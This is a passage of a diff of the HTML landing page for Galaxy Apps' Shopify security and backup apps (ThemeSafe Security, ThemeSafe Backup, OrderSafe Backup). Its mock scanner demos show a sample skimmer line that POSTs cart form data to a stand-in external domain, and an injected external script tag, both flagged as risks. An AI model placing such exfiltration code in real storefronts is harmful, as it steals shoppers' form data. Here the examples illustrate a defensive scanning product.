-              ThemeSafe Security — AI-powered theme code review is live
-            </span>
-            <h1>Shopify apps that <span class="hl">protect your store</span> — automatically.</h1>
-            <p class="lede">
-              Galaxy Apps builds the <strong>ThemeSafe suite</strong>: automatic backups for your theme and orders, plus
-              <strong>AI-powered security scanning</strong> that inspects your Liquid &amp; JavaScript files and alerts you before suspicious code costs you sales.
+    <main id="main-content">
+      <!-- ================= 1. ASYMMETRIC SPLIT HERO ================= -->
+      <section class="hero-section">
+        <div class="wrap hero-grid">
+          <!-- Hero Stack: strictly 4 elements (1. Eyebrow, 2. Headline, 3. Subtext <= 20 words, 4. CTAs) -->
+          <div class="hero-copy rv in">
+            <span class="eyebrow-pill">Shopify App Studio</span>
+            <h1>Shopify apps that protect your store <em>automatically.</em></h1>
+            <p class="hero-sub">
+              Automated theme and order backups paired with AI security scanning that catches risky Liquid and JavaScript changes early.
             </p>
-            <div class="hero-ctas">
-              <a class="btn btn-light" href="#products">Explore our apps</a>
-              <a class="btn btn-outline-light" href="#themesafe-security">How ThemeSafe Security works</a>
-            </div>
-            <div class="trust-row">
-              <span class="trust-item">
-                <span class="stars" aria-hidden="true">★★★★★</span>
-                <span><b>5.0 ★</b> on the Shopify App Store</span>
-              </span>
-              <span class="trust-item"><b>Since 2023</b> building for Shopify</span>
-              <span class="trust-item">Trusted by merchants in the <b>US &amp; worldwide</b></span>
+            <div class="hero-actions">
+              <a class="btn-island" href="#products">
+                <span>Explore the suite</span>
+                <span class="btn-pod" aria-hidden="true">
+                  <svg width="14" height="14" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="22" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="128" y1="48" x2="128" y2="208" />
+                    <polyline points="184 152 128 208 72 152" />
+                  </svg>
+                </span>
+              </a>
+              <a class="btn-secondary" href="#themesafe-security">Inspect ThemeSafe AI</a>
             </div>
           </div>
 
-          <div class="hero-visual">
-            <div class="dash-frame" role="region" aria-label="ThemeSafe Security Shopify embedded app dashboard">
-              <div class="dash-bar">
-                <i></i><i></i><i></i>
-                <span class="dash-url">admin.shopify.com/store/black-dove/apps/themesafe-security</span>
-                <span class="dash-status-pill">● Protected</span>
-              </div>
-              <div class="dash-body">
-                <div class="dash-side">
-                  <span class="on">Security Scan</span>
-                  <span>Code Diff</span>
-                  <span>Live Monitor</span>
-                  <span>Rule Engine</span>
-                  <span>Alert Rules</span>
+          <!-- Interactive Component Preview (Double-Bezel Hardware Enclosure) -->
+          <div class="bezel-shell rv in" role="region" aria-label="Interactive ThemeSafe Security file inspector">
+            <div class="bezel-core">
+              <div class="scanner-top">
+                <div class="scanner-store">
+                  <span class="live-indicator" aria-hidden="true"></span>
+                  <span>admin.shopify.com / themesafe-security / Dawn 15.2.0</span>
                 </div>
-                <div class="dash-main">
-                  <div class="dash-main-top">
-                    <div>
-                      <h4>Dawn 15.2.0 (Live Theme)</h4>
-                      <div class="sub">Last scan 4 mins ago · 312 Liquid &amp; JS assets inspected</div>
-                    </div>
-                    <span class="score-chip">92 / 100 <small>· 1 high risk</small></span>
+                <span class="status-chip chip-clean tabular" id="heroScanScore">Score 92/100</span>
+              </div>
+
+              <div class="scanner-tabs" role="tablist" aria-label="Select theme file to inspect">
+                <button class="file-tab active" type="button" role="tab" aria-selected="true" data-file="0">
+                  <span>promo-popup.js</span>
+                  <span class="status-chip chip-risk">Risk</span>
+                </button>
+                <button class="file-tab" type="button" role="tab" aria-selected="false" data-file="1">
+                  <span>header.liquid</span>
+                  <span class="status-chip chip-warn">Review</span>
+                </button>
+                <button class="file-tab" type="button" role="tab" aria-selected="false" data-file="2">
+                  <span>theme.liquid</span>
+                  <span class="status-chip chip-clean">Clean</span>
+                </button>
+              </div>
+
+              <div class="scanner-code-view" id="heroCodeView" aria-live="polite">
+                <div class="code-line"><span class="ln">40</span><span>const cartForm = document.querySelector('form[action="/cart"]');</span></div>
+                <div class="code-line"><span class="ln">41</span><span>if (cartForm) {</span></div>
+                <div class="code-line flagged-risk"><span class="ln">42</span><span>  fetch('https://cdn.quick-deals-track.net/collect', { method: 'POST', body: new FormData(cartForm) });</span></div>
+                <div class="code-line"><span class="ln">43</span><span>}</span></div>
+              </div>
+
+              <div class="scanner-verdict">
+                <div class="scanner-verdict-head">
+                  <span id="heroVerdictTitle">AI Security Finding: Unverified outbound payload</span>
+                  <span class="tabular" id="heroVerdictMeta">Rule #TS-402</span>
+                </div>
+                <p id="heroVerdictBody">
+                  Line 42 serializes cart form inputs and posts them to an external domain registered 4 days ago. ThemeSafe flagged this edit within 30 seconds of saving.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ================= 2. VERIFIED TELEMETRY LEDGER ================= -->
+      <section class="ledger-section" aria-label="Verified studio metrics">
+        <div class="wrap ledger-grid">
+          <div class="ledger-cell tabular">
+            <strong>5.0 ★</strong>
+            <span>Rated 5.0 out of 5 across 8 verified Shopify App Store reviews</span>
+          </div>
+          <div class="ledger-cell tabular">
+            <strong>3 Live Apps</strong>
+            <span>ThemeSafe Security, ThemeSafe Backup, and OrderSafe Backup</span>
+          </div>
+          <div class="ledger-cell tabular">
+            <strong>Since Nov 2023</strong>
+            <span>Continuously maintained on the Shopify App Store</span>
+          </div>
+          <div class="ledger-cell tabular">
+            <strong>0 ms Bloat</strong>
+            <span>All backups and security scans run off-store via Shopify API</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ================= 3. ASYMMETRIC BENTO PRODUCT SUITE ================= -->
+      <section class="section-space" id="products">
+        <div class="wrap">
+          <div class="section-intro rv">
+            <h2>One protection suite, three automated safeguards for your store.</h2>
+            <p>
+              Every Galaxy Apps product runs quietly in the background through the Shopify Admin API, protecting your storefront code, theme assets, and order records without manual exports.
+            </p>
+          </div>
+
+          <!-- 12-Col Asymmetric Bento: 3 items = 3 cells (7-col Flagship + Two stacked 5-col cards) -->
+          <div class="bento-suite">
+            <!-- Cell 1: Flagship ThemeSafe Security -->
+            <article class="bezel-shell bento-flagship rv">
+              <div class="bezel-core">
+                <div class="app-top-row">
+                  <div class="app-glyph" aria-hidden="true">
+                    <svg width="24" height="24" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="18" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M48 56H208V120C208 184 128 224 128 224C128 224 48 184 48 120V56Z" />
+                      <polyline points="96 128 120 152 164 104" />
+                    </svg>
                   </div>
-                  <div class="scan-row">
-                    <code>layout/theme.liquid</code>
-                    <span class="meta-line">248 lines</span>
-                    <span class="tag tag-ok">Clean</span>
+                  <span class="app-rating-badge tabular">Flagship AI · 5.0 ★ (7 reviews)</span>
+                </div>
+
+                <h3>ThemeSafe - Security - Review</h3>
+                <p class="app-summary">
+                  Automated security code review for Shopify themes. Combines deterministic static rules with contextual AI analysis to catch injected scripts, unauthorized edits, and risky third-party snippets before they hurt conversion.
+                </p>
+
+                <div class="flagship-capabilities">
+                  <div class="cap-tile">
+                    <strong>Hybrid Rule + AI Engine</strong>
+                    <span>Static signatures catch known threats while AI inspects obfuscated JS and outbound network calls in context.</span>
                   </div>
-                  <div class="scan-row">
-                    <code>sections/header-group.json</code>
-                    <span class="meta-line">App embed</span>
-                    <span class="tag tag-warn">Review</span>
+                  <div class="cap-tile">
+                    <strong>Real-Time Webhook Guard</strong>
+                    <span>Listens to Shopify theme update events and alerts you with a file-level diff when unexpected edits occur.</span>
                   </div>
-                  <div class="scan-row">
-                    <code>assets/promo-popup.js</code>
-                    <span class="meta-line">Modified 2h ago</span>
-                    <span class="tag tag-risk">High Risk</span>
+                  <div class="cap-tile">
+                    <strong>Plain-Language Reports</strong>
+                    <span>Explains which file changed, why it looks suspicious, and how to fix it without needing a security engineer.</span>
                   </div>
-                  <div class="ai-box">
-                    <div class="ai-head">
-                      <span class="ai-head-left">
-                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                          <path d="M12 3l1.9 4.6L18.5 9l-4.6 1.9L12 15.5l-1.9-4.6L5.5 9l4.6-1.4z" />
-                          <path d="M19 15l.8 2 2 .8-2 .8-.8 2-.8-2-2-.8 2-.8z" />
+                  <div class="cap-tile">
+                    <strong>Zero Storefront Impact</strong>
+                    <span>Reads files via OAuth in the background and never injects tracking scripts into your live storefront.</span>
+                  </div>
+                </div>
+
+                <div class="app-footer-bar">
+                  <span class="price-tag tabular"><strong>Free plan</strong> · Pro from $19/mo</span>
+                  <div style="display: flex; align-items: center; gap: 16px; flex-wrap: wrap">
+                    <a class="text-action" href="privacy.html#themesafe-security">Privacy policy</a>
+                    <a class="btn-island" href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">
+                      <span>Install ThemeSafe Security</span>
+                      <span class="btn-pod" aria-hidden="true">
+                        <svg width="14" height="14" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="22" stroke-linecap="round" stroke-linejoin="round">
+                          <line x1="64" y1="192" x2="192" y2="64" />
+                          <polyline points="88 64 192 64 192 168" />
                         </svg>
-                        AI Security Finding · Rule #TS-402
                       </span>
-                      <span style="font-family: var(--mono); font-size: 0.68rem; color: #9db2cc">line 42</span>
-                    </div>
-                    <p>
-                      <code style="font-family: var(--mono); font-size: 0.72rem">assets/promo-popup.js</code> dynamically injects an external script from an unverified domain and attaches a listener to checkout form inputs.
-                    </p>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </article>
+
+            <!-- Cell 2: ThemeSafe Auto Backup -->
+            <article class="bezel-shell bento-secondary rv">
+              <div class="bezel-core">
+                <div class="app-top-row">
+                  <div class="app-glyph" aria-hidden="true">
+                    <svg width="24" height="24" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="18" stroke-linecap="round" stroke-linejoin="round">
+                      <polyline points="184 104 224 104 224 64" />
+                      <path d="M195.88 195.88A96 96 0 1 1 224 104" />
+                      <polyline points="128 80 128 128 160 144" />
+                    </svg>
+                  </div>
+                  <span class="app-rating-badge tabular">Live Since Nov 2023</span>
+                </div>
+
+                <h3>ThemeSafe - Auto Backup</h3>
+                <p class="app-summary">
+                  Scheduled automatic backups for themes, Liquid templates, sections, and store images with one-click point-in-time recovery.
+                </p>
+
+                <div class="compact-specs">
+                  <span class="spec-pill">1-Click Theme Restore</span>
+                  <span class="spec-pill">Google Drive &amp; Dropbox Sync</span>
+                  <span class="spec-pill">Full Asset Coverage</span>
+                </div>
+
+                <div class="app-footer-bar">
+                  <span class="price-tag"><strong>Free plan</strong> · Free trial</span>
+                  <a class="text-action" href="https://apps.shopify.com/theme-backup-1" target="_blank" rel="noopener">
+                    Install ThemeSafe Backup →
+                  </a>
+                </div>
+              </div>
+            </article>
+
+            <!-- Cell 3: OrderSafe Auto Backup -->
+            <article class="bezel-shell bento-secondary rv">
+              <div class="bezel-core">
+                <div class="app-top-row">
+                  <div class="app-glyph" aria-hidden="true">
+                    <svg width="24" height="24" viewBox="0 0 256 256" fill="none" stroke="currentColor" stroke-width="18" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M224 177.32V78.68a8 8 0 0 0-4.08-6.97l-88-49.5a8 8 0 0 0-7.84 0l-88 49.5A8 8 0 0 0 32 78.68v98.64a8 8 0 0 0 4.08 6.97l88 49.5a8 8 0 0 0 7.84 0l88-49.5A8 8 0 0 0 224 177.32Z" />
+                      <polyline points="32.7 76.92 128 129.08 223.3 76.92" />
+                      <line x1="128" y1="229.6" x2="128" y2="129.08" />
+                    </svg>
+                  </div>
+                  <span class="app-rating-badge tabular">5.0 ★ (1 review) · Dec 2025</span>
+                </div>
+
+                <h3>OrderSafe - Auto Backup</h3>
+                <p class="app-summary">
+                  Continuous, hands-free archiving of every new Shopify order directly to your email and cloud storage for instant audit and recovery.
+                </p>
+
+                <div class="compact-specs">
+                  <span class="spec-pill">Real-Time Order Sync</span>
+                  <span class="spec-pill">Email &amp; Cloud Delivery</span>
+                  <span class="spec-pill">Dispute &amp; Audit Ready</span>
+                </div>
+
+                <div class="app-footer-bar">
+                  <span class="price-tag">Flexible merchant plans</span>
+                  <a class="text-action" href="https://apps.shopify.com/ordersafe-auto-backup" target="_blank" rel="noopener">
+                    Install OrderSafe Backup →
+                  </a>
+                </div>
+              </div>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- ================= 4. EDITORIAL SPLIT WORKBENCH ================= -->
+      <section class="workbench-section" id="themesafe-security">
+        <div class="wrap workbench-grid">
+          <div class="rv">
+            <span class="eyebrow-pill">Hybrid AI Security Engine</span>
+            <h2 style="font-family: var(--display); font-size: clamp(1.95rem, 3.2vw, 2.7rem); font-weight: 800; letter-spacing: -0.025em; line-height: 1.1; margin: 18px 0 14px">
+              An AI security engineer watching every theme edit.
+            </h2>
+            <p style="color: var(--ink-2); margin: 0">
+              Freelancers, third-party apps, and theme updates modify storefront code every week. Click through the pipeline below to see how ThemeSafe inspects changes.
+            </p>
+
+            <!-- Verb-Noun progression buttons (No generic "Step 1 / Step 2 / Step 3" labels) -->
+            <div class="pipeline-list" role="tablist" aria-label="ThemeSafe Security inspection pipeline">
+              <button class="pipeline-btn active" type="button" role="tab" aria-selected="true" data-stage="0">
+                <strong>Connect read-only Shopify OAuth</strong>
+                <span>Install from the Shopify App Store and index all Liquid templates, sections, and JS assets in seconds without touching storefront speed.</span>
+              </button>
+              <button class="pipeline-btn" type="button" role="tab" aria-selected="false" data-stage="1">
+                <strong>Evaluate AST with static rules and AI</strong>
+                <span>Deterministic rules catch known malware signatures while AI code review inspects obfuscated scripts and external data exfiltration in context.</span>
+              </button>
+              <button class="pipeline-btn" type="button" role="tab" aria-selected="false" data-stage="2">
+                <strong>Alert on unauthorized theme diffs</strong>
+                <span>Real-time webhook monitoring compares file changes as they happen and sends a plain-language remediation guide to your inbox.</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="bezel-shell rv">
+            <div class="bezel-core">
+              <div class="diff-header">
+                <span id="wbFileHeader">layout/theme.liquid · OAuth Snapshot #312</span>
+                <span class="status-chip chip-clean" id="wbStatusBadge">312 Files Indexed</span>
+              </div>
+              <div class="diff-body">
+                <pre class="diff-code" id="wbCodeBlock"><code>&lt;!-- Dawn 15.2.0 · Read-only Shopify Admin API sync --&gt;
+&lt;script src="{{ 'constants.js' | asset_url }}" defer="defer"&gt;&lt;/script&gt;
+&lt;script src="{{ 'pubsub.js' | asset_url }}" defer="defer"&gt;&lt;/script&gt;
+<span class="diff-added">+ Indexed 312 Liquid, JSON, and JS files in 3.4s (0 storefront scripts added)</span>
+&lt;script src="{{ 'global.js' | asset_url }}" defer="defer"&gt;&lt;/script&gt;</code></pre>
+
+                <div class="workbench-note" aria-live="polite">
+                  <strong id="wbNoteTitle">Zero-configuration onboarding for non-technical store owners</strong>
+                  <p id="wbNoteBody">
+                    ThemeSafe connects strictly through scoped Shopify Admin APIs. You never have to paste tracking snippets or edit theme files to start scanning.
+                  </p>
+                </div>
+
+                <div class="tier-strip tabular">
+                  <div class="tier-box">
+                    <small>Free</small>
+                    <strong>$0</strong>
+                    <span>1 theme/day · 250 files</span>
+                  </div>
+                  <div class="tier-box featured">
+                    <small>Professional</small>
+                    <strong>$19/mo</strong>
+                    <span>4 themes/day · Live guard</span>
+                  </div>
+                  <div class="tier-box">
+                    <small>Enterprise</small>
+                    <strong>$49/mo</strong>
+                    <span>Unlimited · 24/7 support</span>
                   </div>
                 </div>
               </div>
             </div>
-
-            <div class="float-card float-1">
-              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#2dd4bf" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z" />
-                <path d="M9 11.5l2 2 4-4.5" />
-              </svg>
-              <span>Real-time webhook guard<small>Instant alert on theme file edits</small></span>
-            </div>
-            <div class="float-card float-2">
-              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#f5b544" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M21 12a9 9 0 11-2.6-6.3" />
-                <path d="M21 3v6h-6" />
-              </svg>
-              <span>Auto-backup synced<small>Theme + assets · Google Drive</small></span>
-            </div>
           </div>
         </div>
-      </div>
+      </section>
 
-      <!-- ================= STATS ================= -->
-      <div class="wrap">
-        <div class="stats rv">
-          <div class="stat">
-            <b>3 apps</b>
-            <span>live on the Shopify App Store</span>
-          </div>
-          <div class="stat">
-            <b>5.0 ★</b>
-            <span>across all 8 verified merchant reviews</span>
-          </div>
-          <div class="stat">
-            <b>Nov 2023</b>
-            <span>first app launched &amp; actively maintained</span>
-          </div>
-          <div class="stat">
-            <b>Hanoi → Global</b>
-            <span>product studio serving US &amp; global stores</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- ================= PRODUCTS ================= -->
-      <section class="section" id="products">
+      <!-- ================= 5. ASYMMETRIC MERCHANT PROOF WALL ================= -->
+      <section class="section-space" id="reviews">
         <div class="wrap">
-          <div class="section-head rv">
-            <span class="label">Products</span>
-            <h2>One suite, three ways your Shopify store stays safe</h2>
+          <div class="section-intro rv">
+            <h2>Trusted by US merchants with a 5.0 out of 5 rating.</h2>
             <p>
-              Every Galaxy Apps product solves a critical store reliability problem automatically — no developer on call, no manual CSV or ZIP exports, and no surprises after a theme update.
+              Every merchant review on the Shopify App Store is five stars. Here is what store owners say after running ThemeSafe Security on their live themes.
             </p>
           </div>
 
-          <div class="products">
-            <!-- Card 1: ThemeSafe Security -->
-            <article class="app-card flagship rv">
-              <span class="flag-tag">Flagship · AI-powered</span>
-              <div class="app-icon teal">
-                <svg width="27" height="27" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z" />
-                  <circle cx="12" cy="10" r="3" />
-                  <path d="M12 13v3" />
-                </svg>
-              </div>
-              <h3>ThemeSafe ‑ Security ‑ Review</h3>
-              <p class="tagline">Scan suspicious theme code and monitor unexpected changes — before they cost you sales.</p>
-              <div class="app-meta">
-                <span class="stars" aria-hidden="true">★★★★★</span>
-                <b>5.0</b>
-                <span>(7 reviews)</span>
-                <span class="sep"></span>
-                <span>Launched Dec 2025</span>
-              </div>
-              <ul class="feat">
-                <li>Hybrid static rules + AI contextual code review for Liquid &amp; JS</li>
-                <li>File-level security reports explaining what changed and why it looks risky</li>
-                <li>Real-time webhook monitoring with instant alerts on unauthorized edits</li>
-              </ul>
-              <div class="card-foot">
-                <span class="price-note"><b>Free</b> · Pro from $19/mo</span>
-                <a class="install-link" href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">Install on Shopify →</a>
+          <!-- Asymmetric 1+2 Review Layout (All quotes strictly <= 3 lines, real typographic quotes) -->
+          <div class="reviews-layout">
+            <article class="bezel-shell review-featured rv">
+              <div class="bezel-core">
+                <div>
+                  <div class="review-top">
+                    <span class="star-row" aria-label="5 out of 5 stars">★★★★★</span>
+                    <span class="verified-tag">Verified Shopify Merchant</span>
+                  </div>
+                  <blockquote class="review-quote">
+                    “As someone who edits themes often, this app has been really useful. It helps catch potential issues before they become real problems.”
+                  </blockquote>
+                </div>
+                <div class="merchant-meta">
+                  <div>
+                    <strong>Black Dove Apparel</strong>
+                    <span>United States · July 2026 · ThemeSafe Security</span>
+                  </div>
+                  <a class="text-action" href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">App Store review →</a>
+                </div>
               </div>
             </article>
 
-            <!-- Card 2: ThemeSafe Auto Backup -->
-            <article class="app-card rv">
-              <div class="app-icon blue">
-                <svg width="27" height="27" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M21 12a9 9 0 11-2.6-6.3" />
-                  <path d="M21 3v6h-6" />
-                  <path d="M12 7v5l3 3" />
-                </svg>
-              </div>
-              <h3>ThemeSafe ‑ Auto Backup</h3>
-              <p class="tagline">Never lose your custom theme work — scheduled automatic backups with one-click restore.</p>
-              <div class="app-meta">
-                <span>Free plan available</span>
-                <span class="sep"></span>
-                <span>Launched Nov 2023</span>
-              </div>
-              <ul class="feat">
-                <li>Automated scheduled backups of themes, templates, sections &amp; images</li>
-                <li>Point-in-time recovery — revert a broken storefront in one click</li>
-                <li>Sync copies directly to your own Google Drive or Dropbox account</li>
-              </ul>
-              <div class="card-foot">
-                <span class="price-note"><b>Free</b> plan · free trial</span>
-                <a class="install-link" href="https://apps.shopify.com/theme-backup-1" target="_blank" rel="noopener">Install on Shopify →</a>
-              </div>
-            </article>
+            <div class="review-stack">
+              <article class="bezel-shell rv">
+                <div class="bezel-core">
+                  <div class="review-top">
+                    <span class="star-row" aria-label="5 out of 5 stars">★★★★★</span>
+                    <span class="verified-tag">Verified Shopify Merchant</span>
+                  </div>
+                  <blockquote class="review-quote">
+                    “Exactly what I needed. It helped me identify risky theme issues I wouldn't have noticed, and the report was clear and easy to understand.”
+                  </blockquote>
+                  <div class="merchant-meta">
+                    <div>
+                      <strong>Ireibita Store</strong>
+                      <span>United States · July 2026 · ThemeSafe Security</span>
+                    </div>
+                  </div>
+                </div>
+              </article>
 
-            <!-- Card 3: OrderSafe Auto Backup -->
-            <article class="app-card rv">
-              <div class="app-icon amber">
-                <svg width="27" height="27" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M21 8l-9-5-9 5v8l9 5 9-5z" />
-                  <path d="M3 8l9 5 9-5" />
-                  <path d="M12 13v8" />
-                </svg>
-              </div>
-              <h3>OrderSafe ‑ Auto Backup</h3>
-              <p class="tagline">Your order history, backed up automatically to email and cloud — recoverable anytime.</p>
-              <div class="app-meta">
-                <span class="stars" aria-hidden="true">★★★★★</span>
-                <b>5.0</b>
-                <span>(1 review)</span>
-                <span class="sep"></span>
-                <span>Launched Dec 2025</span>
-              </div>
-              <ul class="feat">
-                <li>Every new order backed up automatically — zero manual CSV exports</li>
-                <li>Redundant copies delivered to your email and cloud storage</li>
-                <li>Fast audit &amp; recovery when orders are edited, archived or disputed</li>
-              </ul>
-              <div class="card-foot">
-                <span class="price-note">See plans on Shopify</span>
-                <a class="install-link" href="https://apps.shopify.com/ordersafe-auto-backup" target="_blank" rel="noopener">Install on Shopify →</a>
-              </div>
-            </article>
+              <article class="bezel-shell rv">
+                <div class="bezel-core">
+                  <div class="review-top">
+                    <span class="star-row" aria-label="5 out of 5 stars">★★★★★</span>
+                    <span class="verified-tag">Verified Shopify Merchant</span>
+                  </div>
+                  <blockquote class="review-quote">
+                    “It helps me stay assured that each theme update is working as expected while giving me full visibility to confirm the changes.”
+                  </blockquote>
+                  <div class="merchant-meta">
+                    <div>
+                      <strong>LittleAngelDreams</strong>
+                      <span>United States · July 2026 · ThemeSafe Security</span>
+                    </div>
+                  </div>
+                </div>
+              </article>
+            </div>
           </div>
         </div>
       </section>
 
-      <!-- ================= SPOTLIGHT ================= -->
-      <section class="section spotlight-band" id="themesafe-security">
-        <div class="wrap">
-          <div class="section-head rv">
-            <span class="label">Flagship Spotlight</span>
-            <h2>ThemeSafe Security: an AI second pair of eyes on your theme code</h2>
+      <!-- ================= 6. STUDIO MANIFESTO & SUPPORT ARCHITECTURE ================= -->
+      <section class="studio-section" id="about">
+        <div class="wrap studio-grid">
+          <div class="studio-copy rv">
+            <h2>An independent Shopify product studio in Hanoi, building since 2023.</h2>
             <p>
-              Third-party apps, freelance contractors, and theme updates all touch your storefront code. ThemeSafe Security inspects every file change the way a dedicated security engineer would.
+              Galaxy Apps is a software product company headquartered in Hanoi, Vietnam. We do not run a custom store-building agency. Our team designs, engineers, and maintains proprietary SaaS applications for the Shopify ecosystem.
             </p>
-          </div>
+            <p>
+              We built the ThemeSafe and OrderSafe suite to give independent merchants automated infrastructure protection that previously required a dedicated security and DevOps team.
+            </p>
 
-          <div class="steps rv" role="tablist" aria-label="How ThemeSafe Security works">
-            <button class="step-btn on" role="tab" aria-selected="true" data-step="0">
-              <span class="num">STEP 01</span>
-              <h3>Connect via the Shopify API</h3>
-              <p>Install from the Shopify App Store and grant read-only theme access via OAuth. No theme snippets to paste or manual setup required.</p>
-            </button>
-            <button class="step-btn" role="tab" aria-selected="false" data-step="1">
-              <span class="num">STEP 02</span>
-              <h3>Rule-based + AI code scan</h3>
-              <p>Deterministic rules catch known malicious signatures while our AI model analyzes obfuscated JavaScript and external data exfiltration in context.</p>
-            </button>
-            <button class="step-btn" role="tab" aria-selected="false" data-step="2">
-              <span class="num">STEP 03</span>
-              <h3>Real-time change alerts</h3>
-              <p>Whenever a theme file is modified, ThemeSafe diffs the change in real time and alerts you with a plain-English risk report.</p>
-            </button>
-          </div>
-
-          <div class="spot-grid">
-            <div class="code-panel rv" aria-label="ThemeSafe Security inspection output">
-              <div class="cp-bar">
-                <span id="cpFileLabel">layout / theme.liquid · Dawn 15.2.0</span>
-                <span class="tag tag-risk" id="cpBadge">1 critical risk</span>
+            <div class="studio-pillars">
+              <div class="pillar-item">
+                <strong>Automatic by default</strong>
+                <span>Scheduled snapshots and webhook listeners run silently without daily manual intervention.</span>
               </div>
-              <pre><code><span class="cm">&lt;!-- Storefront header scripts · inspected by ThemeSafe AI --&gt;</span>
-&lt;<span class="kw">script</span> src=<span class="str">"{{ 'constants.js' | asset_url }}"</span> defer=<span class="str">"defer"</span>&gt;&lt;/<span class="kw">script</span>&gt;
-&lt;<span class="kw">script</span> src=<span class="str">"{{ 'pubsub.js' | asset_url }}"</span> defer=<span class="str">"defer"</span>&gt;&lt;/<span class="kw">script</span>&gt;
-<span class="bad">&lt;<span class="kw">script</span> src=<span class="str">"https://cdn.quick-deals-track.net/pixel-collect.js"</span> async&gt;&lt;/<span class="kw">script</span>&gt;</span>
-&lt;<span class="kw">script</span> src=<span class="str">"{{ 'global.js' | asset_url }}"</span> defer=<span class="str">"defer"</span>&gt;&lt;/<span class="kw">script</span>&gt;</code></pre>
-              <div class="verdict">
-                <span class="tag tag-ai" style="flex: none; margin-top: 2px">AI verdict</span>
-                <p>
-                  <b>High risk (Score: 9.1/10).</b> Unverified external script injected outside standard Shopify App Embed blocks. Script loads an obfuscated payload that reads form inputs on cart and checkout drawers.
-                </p>
-              </div>
-              <div class="verdict" id="stepPanel" aria-live="polite">
-                <span class="tag tag-ok" style="flex: none; margin-top: 2px">Step 1</span>
-                <p id="stepPanelText">
-                  Connected securely through the Shopify Admin API — ThemeSafe indexed 312 Liquid, JSON, and JavaScript files in 3.4 seconds without affecting storefront speed.
-                </p>
-              </div>
-            </div>
-
-            <div class="spot-copy rv">
-              <h3 id="spotTitle">Built for merchants who customize themes often</h3>
-              <p id="spotText">
-                Every time an agency, freelancer, or third-party app touches your theme, there is a risk of leftover tracking scripts, broken Liquid tags, or silent skimmers. ThemeSafe keeps a continuous security audit running between your edits.
-              </p>
-              <ul class="feat">
-                <li>Zero storefront performance impact — scans run off-store via Shopify API</li>
-                <li>Plain-language explanations a store owner can act on immediately</li>
-                <li>Real-time file change monitoring on Professional &amp; Enterprise plans</li>
-              </ul>
-              <div class="plans">
-                <div class="plan">
-                  <h4>Free</h4>
-                  <div class="amt">$0</div>
-                  <ul>
-                    <li>Scan 1 theme per day</li>
-                    <li>Up to 250 theme files</li>
-                    <li>Rule + AI risk report</li>
-                  </ul>
-                </div>
-                <div class="plan mid">
-                  <h4>Professional</h4>
-                  <div class="amt">$19<small> /month</small></div>
-                  <ul>
-                    <li>Up to 4 themes per day</li>
-                    <li>1 theme real-time guard</li>
-                    <li>Unlimited theme files</li>
-                  </ul>
-                </div>
-                <div class="plan">
-                  <h4>Enterprise</h4>
-                  <div class="amt">$49<small> /month</small></div>
-                  <ul>
-                    <li>Unlimited daily scans</li>
-                    <li>Unlimited real-time guard</li>
-                    <li>24/7 priority support</li>
-                  </ul>
-                </div>
-              </div>
-              <div style="margin-top: 24px">
-                <a class="btn btn-primary" href="https://apps.shopify.com/themesafe-security" target="_blank" rel="noopener">Start scanning free on Shopify →</a>
+              <div class="pillar-item">
+                <strong>Strict data minimization</strong>
+                <span>We access only the scoped Shopify APIs required for your app and never sell merchant or customer data.</span>
               </div>
             </div>
           </div>
-        </div>
-      </section>
 
-      <!-- ================= REVIEWS ================= -->
-      <section class="section" id="reviews">
-        <div class="wrap">
-          <div class="section-head rv">
-            <span class="label">Merchant Reviews</span>
-            <h2>Rated 5.0 out of 5 on the Shopify App Store</h2>
-            <p>Verified reviews from Shopify merchants in the United States running ThemeSafe Security in production.</p>
-          </div>
-          <div class="reviews">
-            <article class="review-card rv">
-              <div class="review-card-top">
-                <span class="stars" aria-label="5 out of 5 stars">★★★★★</span>
-                <span class="verified-pill">✓ Verified on Shopify</span>
-              </div>
-              <blockquote>
-                “As someone who edits themes often, this app has been really useful. It helps catch potential issues before they become real problems.”
-              </blockquote>
-              <div class="review-who">
-                <span class="avatar" style="background: #7c5cbf">BD</span>
-                <div>
-                  <b>Black Dove Apparel</b>
-                  <span>United States · July 2026 · ThemeSafe Security</span>
-                </div>
-              </div>
-            </article>
-
-            <article class="review-card rv">
-              <div class="review-card-top">
-                <span class="stars" aria-label="5 out of 5 stars">★★★★★</span>
-                <span class="verified-pill">✓ Verified on Shopify</span>
-              </div>
-              <blockquote>
-                “Exactly what I needed. It helped me identify risky theme issues I wouldn't have noticed, and the report was clear and easy to understand.”
-              </blockquote>
-              <div class="review-who">
-                <span class="avatar" style="background: #0d9488">IS</span>
-                <div>
-                  <b>Ireibita Store</b>
-                  <span>United States · July 2026 · ThemeSafe Security</span>
-                </div>
-              </div>
-            </article>
-
-            <article class="review-card rv">
-              <div class="review-card-top">
